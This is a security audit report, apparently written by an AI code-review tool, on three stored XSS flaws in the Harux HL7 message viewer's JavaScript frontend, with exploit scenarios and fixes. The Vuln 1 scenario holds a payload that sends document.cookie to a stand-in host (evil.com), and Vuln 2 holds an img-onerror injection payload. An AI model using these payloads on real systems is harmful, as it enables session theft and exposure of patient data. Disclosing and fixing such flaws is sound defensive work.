# Harux — Security Review Report

**Date:** 2026-03-06
**Scope:** Full codebase review
**Reviewer:** Automated security audit (Claude Code)

---

## Summary

A comprehensive security review of the Harux codebase identified **3 confirmed vulnerabilities** — all Stored Cross-Site Scripting (XSS) in the vanilla JavaScript frontend (`static/app.js`). Attacker-controlled HL7 message data received via the unauthenticated MLLP TCP port is rendered into the DOM without proper sanitization, allowing JavaScript execution in the browsers of all connected users.

| # | Vulnerability | Severity | File | Confidence |
|---|---|---|---|---|
| 1 | XSS via `message_control_id` in `onclick` handler | HIGH | `static/app.js:244` | 9/10 |
| 2 | XSS via unescaped `seg.name` in HTML/attributes | HIGH | `static/app.js:254,257` | 9/10 |
| 3 | Attribute injection via incomplete `esc()` function | MEDIUM | `static/app.js:147,367` | 8/10 |

---

## Vuln 1: Stored XSS via `message_control_id` in `onclick` Handler

**File:** `static/app.js:244`
**Severity:** HIGH
**Category:** Stored XSS (Injection & Code Execution)
**Confidence:** 9/10

### Description

The HL7 MSH-10 field (`message_control_id`) is attacker-controlled input received over MLLP TCP. It is extracted verbatim in `src/hl7/parser.rs:56` with zero sanitization, stored, serialized to JSON, and pushed to all WebSocket clients. In `app.js`, it is interpolated directly into an `onclick` attribute **without** the `esc()` function:

```javascript
// Line 239
const key = `${msg.message_control_id}-${segIdx}`;
// Line 244
<div class="segment-name" onclick="toggleSegment('${key}')">
```

The `esc()` function is correctly applied to other values nearby (e.g., `seg.name` on line 246, field values on line 255) but is **missing** on `key`. A single-quote in `message_control_id` breaks out of the JavaScript string literal inside the `onclick` attribute.

### Exploit Scenario

1. Attacker sends an HL7 message via MLLP (port 2575) with MSH-10 set to: `');fetch('//evil.com/'+document.cookie);//`
2. Full message: `MSH|^~\&|APP|FAC|||20240101||ADT^A01|');fetch('//evil.com/'+document.cookie);//|P|2.5\rPID|||123||Smith^John`
3. The message is stored and broadcast to all connected WebSocket clients in real-time.
4. When any user clicks the message and the "Parsed" tab renders, the DOM contains: `onclick="toggleSegment('');fetch('//evil.com/'+document.cookie);//-0')"`
5. Clicking the segment header executes the attacker's JavaScript, exfiltrating all HL7 message data (including patient PII) visible in the browser.

### Recommendation

Replace inline `onclick` string interpolation with `data-*` attributes and event delegation:

```javascript
// Use a server-generated UUID (msg.id) instead of attacker-controlled message_control_id
<div class="segment-name" data-seg-key="${msg.id}-${segIdx}">

// Event delegation
document.addEventListener('click', (e) => {
    const el = e.target.closest('.segment-name');
    if (el) toggleSegment(el.dataset.segKey);
});
```

---

## Vuln 2: Stored XSS via Unescaped `seg.name` in HTML and Attribute Contexts

**File:** `static/app.js:254,257`
**Severity:** HIGH
**Category:** Stored XSS (Injection & Code Execution)
**Confidence:** 9/10

### Description

HL7 segment names are parsed in `src/hl7/parser.rs:125-126` as everything before the first field separator — with **no validation** that the name conforms to the expected 3-character alphanumeric pattern (e.g., `MSH`, `PID`). In `app.js`, `seg.name` is used **without** `esc()` in two locations, despite being correctly escaped on line 246:

```javascript
// Line 254 — innerHTML injection (no escaping)
<td class="field-idx">${seg.name}-${f.index}</td>

// Line 257 — attribute injection (no escaping)
<span title="${seg.name}-${f.index}.${i + 1}">${esc(c)}</span>
```

The developer applied `esc(seg.name)` on line 246 but omitted it on lines 254 and 257 — an inconsistency that confirms this is a bug.

### Exploit Scenario

1. Attacker sends an HL7 message via MLLP with a crafted segment: `MSH|^~\&|APP|FAC|||20240101||ADT^A01|CTRL1|P|2.5\r<img src=x onerror=alert(document.cookie)>|field1|field2`
2. The parser extracts `<img src=x onerror=alert(document.cookie)>` as the segment name (everything before the first `|`).
3. On line 254, this is injected directly into the DOM via `innerHTML`, causing the `<img>` tag's `onerror` handler to execute JavaScript immediately when the parsed view renders.
4. No user click is required — simply viewing the "Parsed" tab triggers execution.

### Recommendation

Apply `esc()` to `seg.name` on lines 254 and 257, and use an attribute-safe escaper for the `title` context:

```javascript
// Line 254
<td class="field-idx">${esc(seg.name)}-${f.index}</td>

// Line 257 — use escAttr() for attribute context
<span title="${escAttr(seg.name + '-' + f.index + '.' + (i+1))}">${esc(c)}</span>
```

---

## Vuln 3: Stored XSS via Attribute Injection — Incomplete `esc()` Function

**File:** `static/app.js:147,367`
**Severity:** MEDIUM
**Category:** Stored XSS via HTML Attribute Injection
**Confidence:** 8/10

### Description

The `esc()` function (line 367) uses the `textContent`/`innerHTML` technique which escapes `<`, `>`, and `&` but does **NOT** escape `"` (double quote) or `'` (single quote). This is correct for HTML text content but **insufficient for HTML attribute contexts**. The function is used inside a `title` attribute on line 147:

```javascript
title="${esc(msg.parse_error)}"
```

The `parse_error` value is constructed in `src/hl7/parser.rs:13-16` using Rust's `{:?}` format on the first 20 characters of the raw attacker-controlled input. Rust's `{:?}` wraps the string in literal `"` characters — and since `esc()` does not escape `"`, these quotes terminate the HTML attribute, allowing injection of arbitrary HTML attributes including event handlers.

In HTML, the backslash in Rust's `\"` escape has **no special meaning** — the `"` still terminates the attribute regardless of the preceding `\`.

### Exploit Scenario

1. Attacker sends a non-MSH message to the MLLP port starting with crafted bytes designed to produce a `parse_error` containing `"` characters from `{:?}` formatting.
2. The parse error is stored and displayed in the message list with `⚠ PARSE ERROR`.
3. The `title` attribute breaks at the `{:?}`-inserted `"`, and subsequent content is parsed as new HTML attributes.
4. With careful crafting within the 20-character limit, event handlers like `onmouseover` can be injected.

### Recommendation

Create a proper attribute-escaping function and use it for all attribute contexts:

```javascript
function escAttr(str) {
    if (!str) return '';
    return str.replace(/&/g, '&amp;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#x27;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;');
}

// Line 147: use escAttr instead of esc
title="${escAttr(msg.parse_error)}"
```

---

## Prioritized Remediation

| Priority | Vuln | Severity | Fix Effort |
|----------|------|----------|------------|
| 1 | Vuln 2: XSS via unescaped `seg.name` | HIGH | Low — add `esc()` calls on 2 lines |
| 2 | Vuln 1: XSS via `message_control_id` in `onclick` | HIGH | Low — switch to `data-*` attributes + event delegation |
| 3 | Vuln 3: `esc()` insufficient for attributes | MEDIUM | Low — add `escAttr()` function, update attribute usages |

All three vulnerabilities share a common root cause: attacker-controlled HL7 message content flows from the MLLP TCP port through the server into the vanilla JS frontend, where it is rendered via `innerHTML` without consistent sanitization. A systematic fix should audit **every** template literal in `app.js` that uses `innerHTML` and ensure all interpolated values are escaped appropriately for their context (text content vs. attribute vs. JavaScript string).

---

## Non-Findings (Areas Reviewed and Cleared)

| Area | Result |
|---|---|
| Path Traversal in static file serving | `rust-embed` embeds files at compile time into a hash map — path traversal not possible |
| SQL / Command Injection | No database or OS command execution in the codebase |
| Deserialization Attacks | Only `serde_json` (safe) and TOML config (trusted input) |
| WebSocket Message Injection | Server ignores all incoming WebSocket client messages |
| GitHub Actions CI/CD | Uses pinned actions, no untrusted checkout patterns |
| Configuration File Handling | Safe `serde` TOML deserialization with proper error handling |
